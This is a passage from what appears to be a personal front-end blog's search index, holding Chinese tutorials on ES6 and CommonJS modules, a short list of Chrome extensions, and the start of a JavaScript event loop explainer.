模块的差异</h3><blockquote>\n<p>它们有两个重大差异</p>\n</blockquote>\n<ul>\n<li>CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。</li>\n<li>CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。</li>\n</ul>\n<h4 id=\"ES6-模块加载-CommonJS-模块\"><a href=\"#ES6-模块加载-CommonJS-模块\" class=\"headerlink\" title=\"ES6 模块加载 CommonJS 模块\"></a>ES6 模块加载 CommonJS 模块</h4><p>CommonJS 模块的输出都定义在module.exports这个属性上面。Node 的import命令加载 CommonJS 模块，Node 会自动将module.exports属性，当作模块的默认输出，即等同于export default xxx。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// a.js</span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  foo: &apos;hello&apos;,</span><br><span class=\"line\">  bar: &apos;world&apos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 等同于</span><br><span class=\"line\">export default &#123;</span><br><span class=\"line\">  foo: &apos;hello&apos;,</span><br><span class=\"line\">  bar: &apos;world&apos;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>一共有三种写法，可以拿到 CommonJS 模块的module.exports。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 写法一</span><br><span class=\"line\">import baz from &apos;./a&apos;;</span><br><span class=\"line\">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 写法二</span><br><span class=\"line\">import &#123;default as baz&#125; from &apos;./a&apos;;</span><br><span class=\"line\">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 写法三</span><br><span class=\"line\">import * as baz from &apos;./a&apos;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"CommonJS-模块加载-ES6-模块\"><a href=\"#CommonJS-模块加载-ES6-模块\" class=\"headerlink\" title=\"CommonJS 模块加载 ES6 模块\"></a>CommonJS 模块加载 ES6 模块</h4><p>CommonJS 模块加载 ES6 模块，不能使用require命令，而要使用import()函数。ES6 模块的所有输出接口，会成为输入对象的属性。</p>\n<h3 id=\"导出模块-1\"><a href=\"#导出模块-1\" class=\"headerlink\" title=\"导出模块\"></a>导出模块</h3><h4 id=\"导出方式\"><a href=\"#导出方式\" class=\"headerlink\" title=\"导出方式\"></a>导出方式</h4><p>1、多次使用export</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// profile.js</span><br><span class=\"line\">export var firstName = &apos;Michael&apos;;</span><br><span class=\"line\">export var lastName = &apos;Jackson&apos;;</span><br><span class=\"line\">export var year = 1958;</span><br></pre></td></tr></table></figure>\n<p>export命令对外部输出了三个变量。</p>\n<p>2、导出对象</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// profile.js</span><br><span class=\"line\">var firstName = &apos;Michael&apos;;</span><br><span class=\"line\">var lastName = &apos;Jackson&apos;;</span><br><span class=\"line\">var year = 1958;</span><br><span class=\"line\"></span><br><span class=\"line\">export &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure>\n<p>3、直接导出单个变量、函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export function multiply(x, y) &#123;</span><br><span class=\"line\">  return x * y;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>4、导出默认模块</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 正确</span><br><span class=\"line\">export var a = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">// 正确</span><br><span class=\"line\">var a = 1;</span><br><span class=\"line\">export default a;</span><br><span class=\"line\"></span><br><span class=\"line\">// 错误</span><br><span class=\"line\">export default var a = 1;</span><br></pre></td></tr></table></figure>\n<h4 id=\"导出注意点\"><a href=\"#导出注意点\" class=\"headerlink\" title=\"导出注意点\"></a>导出注意点</h4><p><strong>export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。</strong>(简而言之导出的必须是对象的key)</p>\n<blockquote>\n<p>必须建议意义对应关系</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export var year = 1958;</span><br><span class=\"line\">//==</span><br><span class=\"line\">export &#123;</span><br><span class=\"line\">    year</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 报错</span><br><span class=\"line\">export 1;</span><br><span class=\"line\">// 报错</span><br><span class=\"line\">var m = 1;</span><br><span class=\"line\">export m;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>上面两种写法都会报错，因为没有提供对外的接口。正确写法：</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 写法一</span><br><span class=\"line\">export var m = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">// 写法二</span><br><span class=\"line\">var m = 1;</span><br><span class=\"line\">export &#123;m&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 写法三</span><br><span class=\"line\">var n = 1;</span><br><span class=\"line\">export &#123;n as m&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>同样的，function和class的输出，也必须遵守这样的写法。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 报错</span><br><span class=\"line\">function f() &#123;&#125;</span><br><span class=\"line\">export f;</span><br><span class=\"line\"></span><br><span class=\"line\">// 正确</span><br><span class=\"line\">export function f() &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 正确</span><br><span class=\"line\">function f() &#123;&#125;</span><br><span class=\"line\">export &#123;f&#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>另外，export语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。</strong></p>\n<h4 id=\"模块别名\"><a href=\"#模块别名\" class=\"headerlink\" title=\"模块别名\"></a>模块别名</h4><p>浏览器加载 <strong>ES6</strong> 模块，也使用<strong><code>&lt;script&gt;</code></strong>标签，但是要加入<strong>type=”module”</strong>属性</p>\n<p>浏览器对于带有<strong>type=”module”</strong>的<strong><code>&lt;script&gt;</code></strong>，等同于打开了<strong><code>&lt;script&gt;</code>标签的defer</strong>属性。</p>\n<blockquote>\n<p>ES6 模块也允许内嵌在网页中</p>\n</blockquote>\n<ul>\n<li>代码是在模块作用域之中运行，而不是在全局作用域运行。模块内部的顶层变量，外部不可见。</li>\n<li>模块脚本自动采用严格模式，不管有没有声明use strict。</li>\n<li>模块之中，可以使用import命令加载其他模块（.js后缀不可省略，需要提供绝对 URL 或相对 URL），也可以使用export命令输出对外接口。</li>\n<li>模块之中，顶层的this关键字返回undefined，而不是指向window。也就是说，在模块顶层使用this关键字，是无意义的。</li>\n<li>同一个模块如果加载多次，将只执行一次。</li>\n</ul>\n<blockquote>\n<p>示例模块</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import utils from &apos;https://example.com/js/utils.js&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">const x = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(x === window.x); //false</span><br><span class=\"line\">console.log(this === undefined); // true</span><br></pre></td></tr></table></figure>\n<h3 id=\"导入模块\"><a href=\"#导入模块\" class=\"headerlink\" title=\"导入模块\"></a>导入模块</h3><p>使用export命令定义了模块的对外接口以后，其他 JS 文件就可以通过import命令加载这个模块。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// main.js</span><br><span class=\"line\">import &#123;firstName, lastName, year&#125; from &apos;./profile.js&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">function setName(element) &#123;</span><br><span class=\"line\">  element.textContent = firstName + &apos; &apos; + lastName;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>注意，import命令具有提升效果，会提升到整个模块的头部，首先执行。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo();</span><br><span class=\"line\">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// ===&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">import &#123; foo &#125; from &apos;my_module&apos;;</span><br><span class=\"line\">foo();</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>导入默认模块</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// export-default.js</span><br><span class=\"line\">export default function () &#123;</span><br><span class=\"line\">  console.log(&apos;foo&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// import-default.js</span><br><span class=\"line\">import customName from &apos;./export-default&apos;;</span><br><span class=\"line\">customName(); // &apos;foo&apos;</span><br></pre></td></tr></table></figure>\n<h4 id=\"导入别名设置\"><a href=\"#导入别名设置\" class=\"headerlink\" title=\"导入别名设置\"></a>导入别名设置</h4><p>将surname是lastName的别名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; lastName as surname &#125; from &apos;./profile.js&apos;;</span><br></pre></td></tr></table></figure>\n<p>将多个方法融合成一个</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// circle.js</span><br><span class=\"line\"></span><br><span class=\"line\">export function area(radius) &#123;</span><br><span class=\"line\">  return Math.PI * radius * radius;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">export function circumference(radius) &#123;</span><br><span class=\"line\">  return 2 * Math.PI * radius;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import * as circle from &apos;./circle&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;圆面积：&apos; + circle.area(4));</span><br><span class=\"line\">console.log(&apos;圆周长：&apos; + circle.circumference(14));</span><br></pre></td></tr></table></figure>\n<h4 id=\"按需加载\"><a href=\"#按需加载\" class=\"headerlink\" title=\"按需加载\"></a>按需加载</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import(&apos;./utils.js&apos;)</span><br><span class=\"line\">.then(Util =&gt; &#123;</span><br><span class=\"line\">    console.log(Util);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"CMD\"><a href=\"#CMD\" class=\"headerlink\" title=\"CMD\"></a>CMD</h2><p>CMD(common module definition), 是sea.js在推广过程中对模块定义的规范化产出，主要用于浏览器端。推崇依赖就近、延迟执行。它的核心思想是：每个文件都是一个模块，在模块中定义的变量、函数、类都是私有的，对外不可见。有一个全局性方法require()，用于加载模块</p>\n<p>AMD规范（Asynchronous Module Definition）：是 RequireJS 在推广过程中对模块定义的规范化产出，也是主要用于浏览器端。其特点是：依赖前置，需要在定义时就写好需要的依赖，提前执行依赖，应用有require.js</p>\n<h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><ul>\n<li><a href=\"http://javascript.ruanyifeng.com/nodejs/module.html#toc0\" target=\"_blank\" rel=\"noopener\">CommonJS规范</a></li>\n</ul>\n","categories":["js"],"tags":["js"]},{"title":"chrome常用插件","url":"http://zhoushaw.github.io/2019/03/16/other/tool/chrome-extend/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>chrome可以称之为前端开发者的神器，不管是开发还是调试。并且chrome给用户带来的体验简直QAQ，chrome插件无疑会大大提供工作效率，这里将会列出个人常用的chrome插件</p>\n<div><a id=\"more\"></a></div>\n\n<h2 id=\"插件列表\"><a href=\"#插件列表\" class=\"headerlink\" title=\"插件列表\"></a>插件列表</h2><blockquote>\n<p>Fair AdBlocker</p>\n</blockquote>\n<p>远离那些讨厌的广告吧。<br>右击选中对应命令，点击要消除的element，即可永久消除对应的AdBlocker。</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_2a13j39fgc4a8l7db14kh8438jekg_648x398.png\" alt=\"\"></p>\n<p>总结来说:嗯！真香</p>\n<blockquote>\n<p>Infinity</p>\n</blockquote>\n<p>Infinity,超棒的无广告，体验好的。导航页</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_0l5glj75lb0b6fb6hdf727ea1ij7f_1235x860.png\" alt=\"\"></p>\n<blockquote>\n<p>Allow-Control-Allow-Origin</p>\n</blockquote>\n<p>解决跨域神器。有时候后端跟你说，线下不支持跨域？？没办法自己支持吧，就用这个神器</p>\n<blockquote>\n<p>Tampermonkey</p>\n</blockquote>\n<p>俗称为猴油浏览器插件，支持第三方JS注入，实现比较酷炫的事情。<br><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190419_122h6g0jhf8c2353fga0gaecb51ee_2494x556.png\" alt=\"\"></p>\n<p>下面列举一下：</p>\n<ul>\n<li>豆瓣资源大师<br><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190419_4g6gk82abld135e11d57gi7b90g77_2472x1330.png\" alt=\"\"></li>\n<li>百度云下载助手<br><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190419_4b5l6ahibd5cgfdd4cj7dc3e76bcb_1966x1296.png\" alt=\"\"></li>\n</ul>\n","categories":["tool"],"tags":["chrome"]},{"title":"Event loop","url":"http://zhoushaw.github.io/2019/03/01/learning/font-end/event loop/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>请问下面输出的结果是什么</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">console.log(&apos;script start&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(function() &#123;</span><br><span class=\"line\">  console.log(&apos;setTimeout&apos;);</span><br><span class=\"line\">&#125;, 0);</span><br><span class=\"line\"></span><br><span class=\"line\">Promise.resolve().then(function() &#123;</span><br><span class=\"line\">  console.log(&apos;promise1&apos;);</span><br><span class=\"line\">&#125;).then(function() &#123;</span><br><span class=\"line\">  console.log(&apos;promise2&apos;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script end&apos;);</span><br></pre></td></tr></table></figure>\n<p>纳尼？？仿佛又回想了当初被面试官支配时的恐惧了！！</p>\n<p>骚年稳住别慌，这道面试题考察的是你对Event loop事件循环的理解，当你深入了解浏览器或Node中如何处理事件循环的时候，上面此类题目对你来说就是so easy，好了话不多说让我们快速进入正题吧。</p>\n<div><a id=\"more\"></a></div>\n\n\n<h2 id=\"Event-loop\"><a href=\"#Event-loop\" class=\"headerlink\" title=\"Event loop\"></a>Event loop</h2><blockquote>\n<p>是什么</p>\n</blockquote>\n<p><strong>Event loop</strong>即事件循环，是浏览器和Node环境中运行<strong>单线程JavaScript</strong>一种不阻塞运行的一种机制。也就是我们常常称之为的异步的原理。</p>\n<blockquote>\n<p>有什么作用</p>\n</blockquote>\n<ul>\n<li><p>类似于上面问答中的代码，一般情况下是不会产生的。但是由于一些业务场景迫使我们<strong>不可避免的编写出多个异步事件</strong>，而我们对其<strong>运行顺序不知其所以然</strong>，难免会造成不必要的困扰</p>\n</li>\n<li><p>当然Event loop也是面试场上的常胜将军，大多数同学都<strong>折戟于此</strong></p>\n</li>\n<li><p>市场上框架、新技术层出不穷，想要在风云突变的战场上稳住脚跟就必须<strong>修炼好内功</strong>，了解一些底层原理无非是非常好的路径</p>\n</li>\n</ul>\n<h2 id=\"储备知识\"><a href=\"#储备知识\" class=\"headerlink\" title=\"储备知识\"></a>储备知识</h2><p>在正式Event loop讲解前，我们先回顾一下基本数据结构知识</p>\n<blockquote>\n<p>队列</p>\n</blockquote>\n<p>队列是一种操作受限制的线性表，它只运行从<strong>表的前端(front)</strong>进行删除操作，<strong>表的后端(rear)</strong>进行添加操作。</p>\n<p>进行删除操作的称之为<strong>表头</strong>，添加操作的称之为<strong>表尾</strong>，空的队列称之为<strong>空队列</strong>。</p>\n<p>队列的线性结构赋予<strong>其先进先出</strong>的特性</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190301_80cgh13fd23fjkahjd296l7ig9e68_1152x241.jpg\" alt=\"\"></p>\n<blockquote>\n<p>栈</p>\n</blockquote>\n<p>栈是一种操作受限制的线性表，它只运行从表的<strong>尾端(rear)</strong>进行<strong>添加操作和删除操作</strong></p>\n<p>栈的限制结构赋予其<strong>先进后出</strong>的特性</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190301_3g51f9k9h099ga3lecj98d6adchh5_1344x752.jpg\" alt=\"\"></p>\n<h2 id=\"Event-loop任务\"><a href=\"#Event-loop任务\" class=\"headerlink\" title=\"Event loop任务\"></a>Event loop任务</h2><p>在JavaScript中，会将执行的任务分为两类，一种是<strong>宏任务</strong>(MacroTask)简称为<strong>Task</strong>,另一种是<strong>微任务</strong>(MicroTask)</p>\n<blockquote>\n<p>宏任务类型</p>\n</blockquote>\n<p><strong>script全部代码</strong>、<strong>setTimeout</strong>、<strong>setInterval</strong>、<strong>I/O</strong>、<strong>UI Rendering</strong></p>\n<blockquote>\n<p>微任务</p>\n</blockquote>\n<p><strong>Process.nextTick</strong>（Node独有）、<strong>Promise</strong>、<strong>MutationObserver</strong></p>\n<h2 id=\"浏览器Event-loop\"><a href=\"#浏览器Event-loop\" class=\"headerlink\" title=\"浏览器Event loop\"></a>浏览器Event loop</h2><p>在JavaScript中有一个<strong>主线程</strong>(main thread) 和<strong>调用栈</strong> (call-stack) ,所有任务都会被放到调用栈等待主线程执行。</p>\n<blockquote>\n<p>JS调用栈</p>\n</blockquote>\n<p>JS调用栈采用栈结构，是先进后出规则，当函数执行的时候会放到栈的顶部，当函数执行完成会将函数从栈顶移除，遇到新函数会新函数将推入栈内，执行完成从栈顶移除，直到栈被清空</p>\n<p>列如:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function task1 () &#123;</span><br><span class=\"line\">    console.log(&apos;task1&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function task2 () &#123;</span><br><span class=\"line\">    task1();</span><br><span class=\"line\">    console.log(&apos;hello world&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">task2();</span><br></pre></td></tr></table></figure>\n<p>执行到task1()时，栈内容为:task2 task1，依次执行并移除task1、task2</p>\n<blockquote>\n<p>同步任务和异步任务</p>\n</blockquote>\n<p>在JavaScript将任务分为同步任务和异步任务，同步任务将依次放入调用栈中按照先进后出的规则，放入主线程执行。异步任务则是等待执行结果返回后放入任务队列中等待主线程空闲时(调用栈为空时，同步任务被执行完成时)，被读取到调用栈内等待主线程执行。</p>\n<p>简单来说可以将其区域分为三个区域:</p>\n<ul>\n<li>任务队列区</li>\n<li>主线程执行区</li>\n<li>MacroTask区</li>\n<li>MicroTask区</li>\n</ul>\n<blockquote>\n<p>任务之间执行顺序</p>\n</blockquote>\n<p>JavaScript代码在运行时，主线程顺序执行代码，按照栈的结构先进后出，将微任务存入微任务区，宏任务存入宏任务区。</p>\n<p>##<br>当任务队列任务为空时，将会查看MicroTask区队列是否为空，若为空则查询MacroTask区并执行。若不为空则执行MicroTask区任务，若遇到任务中存在MacroTask将存入MacroTask区队尾。执行MicroTask任务完成后将，执行MacroTask区任务</p>\n<h2 id=\"解答文章头部提出的问题\"><a href=\"#解答文章头部提出的问题\" class=\"headerlink\" title=\"解答文章头部提出的问题\"></a>解答文章头部提出的问题</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">console.log(&apos;script start&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(function() &#123;</span><br><span class=\"line\">  console.log(&apos;setTimeout&apos;);</span><br><span class=\"line\">&#125;, 0);</span><br><span class=\"line\"></span><br><span class=\"line\">Promise.resolve().then(function() &#123;</span><br><span class=\"line\">  console.log(&apos;promise1&apos;);</span><br><span class=\"line\">&#125;).then(function() &#123;</span><br><span class=\"line\">  console.log(&apos;promise2&apos;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script end&apos;);</span><br></pre></td></tr></table></figure>\n<p>JavaScript在运行这段代码逐行执行，按照调用栈、宏任务、微任务执行过程如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#过程一:</span><br><span class=\"line\"></span><br><span class=\"line\">MicroTask: </span><br><span class=\"line\">MacroTask: setTimeout</span><br><span class=\"line\"></span><br><span class=\"line\">call-Task: </span><br><span class=\"line\"></span><br><span class=\"line\">Log: script start</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#过程二:</span><br><span class=\"line\"></span><br><span class=\"line\">MicroTask: Promise.then</span><br><span class=\"line\">MacroTask: setTimeout</span><br><span class=\"line\"></span><br><span class=\"line\">call-Task: </span><br><span class=\"line\"></span><br><span class=\"line\">Log: script start</span><br><span class=\"line\"></span><br><span class=\"line\">#过程三:</span><br><span class=\"line\"></span><br><span class=\"line\">MicroTask: </span><br><span class=\"line\">MacroTask: setTimeout</span><br><span class=\"line\"></span><br><span class=\"line\">call-Task: Promise.then</span><br><span class=\"line\"></span><br><span class=\"line\">Log:  script start、 script end</span><br><span class=\"line\"></span><br><span class=\"line\">#过程四:</span><br><span class=\"line\"></span><br><span class=\"line\">MicroTask: Promise.then promise2</span><br><span class=\"line\">MacroTask: setTimeout</span><br><span class=\"line\"></span><br><span class=\"line\">call-Task: </span><br><span class=\"line\"></span><br><span class=\"line\">Log:  script start、 script end、promise1</span><br><span class=\"line\"></span><br><span class=\"line\">#过程五:</span><br><span class=\"line\"></span><br><span class=\"line\">MicroTask: </span><br><span class=\"line\">MacroTask: setTimeout</span><br><span class=\"line\"></span><br><span class=\"line\">call-Task: Promise.then promise2</span><br><span class=\"line\"></span><br><span class=\"line\">Log:  script start、 script end、promise1</span><br><span class=\"line\"></span><br><span class=\"line\">#过程五:</span><br><span class=\"line\"></span><br><span class=\"line\">MicroTask: </span><br><span class=\"line\">MacroTask: setTimeout</span><br><span class=\"line\"></span><br><span class=\"line\">call-Task: </span><br><span class=\"line\"></span><br><span class=\"line\">Log:  script start、 script end、promise1、promise2</span><br><span 